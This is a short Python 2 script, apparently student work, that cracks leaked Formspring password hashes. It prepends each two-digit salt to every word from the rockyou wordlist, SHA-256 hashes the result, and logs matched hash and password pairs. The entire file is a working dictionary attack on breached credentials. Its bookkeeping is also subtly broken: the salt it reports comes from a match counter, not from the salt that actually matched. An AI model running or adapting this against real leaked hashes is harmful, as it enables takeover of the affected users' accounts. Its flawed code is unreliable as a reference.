#!C:\Python27\python.exe
'''
Kevin Li <kl1983@nyu.edu>
Formspring hash cracker

Similar to linkedin crack, however, we prepended two digit salt 00-99 to the
front of the word before sha256 hashing.

Runtime O(n^4)
'''
import hashlib

def loop():
    #tried with rockyou-10   0 Results
    wordFile = open("rockyou-10.txt")
    saltHash = open("Hashed1.txt",'r+')
    formspring = open("formspring.txt")
    formspringCracked = open("formspringCracked.txt",'w')
    i = 0
    c = 0
    counter  = 0
    found = False

    formspringCracked.write("The left are the hash and the right are passwords \n\n")
    
    for theWord in wordFile:
        c = c + 1
        print "Password attempt number :%i " %(c)
        append(theWord,saltHash)
        for salted in saltHash:
            if(found == True):
                break
            else:
                for formWord in formspring:
                    if(salted.strip() == formWord.strip()):
                        x = ("%02d" % (i,))
                        print "We Got a match : " + x+theWord + '  ' + salted + '\n'  
                        formspringCracked.write(salted.strip() + '       ' +  x.strip()+theWord)
                        found = True
                        saltHash.seek(0)
                        formspring.seek(0)
                        i = i+1
                        counter = counter + 1
                        break
                if(found == False):
                    formspring.seek(0)
        found = False
        saltHash.seek(0)
        formspring.seek(0)
    formspringCracked.write("\n\n The total number of passwords cracked is : " + str(counter) +" \n\n")
   
def append(word,saltHash):
    i = 00
    while (i!= 100):
        x = ("%02d" % (i,)+ word.strip('\n'))
        h = hashlib.sha256()
        h.update(x)
        saltHash.write(h.hexdigest() + '\n')
        i = i+1
    saltHash.seek(0)
  
      
def main():
    loop()

if __name__ == '__main__':
    main()
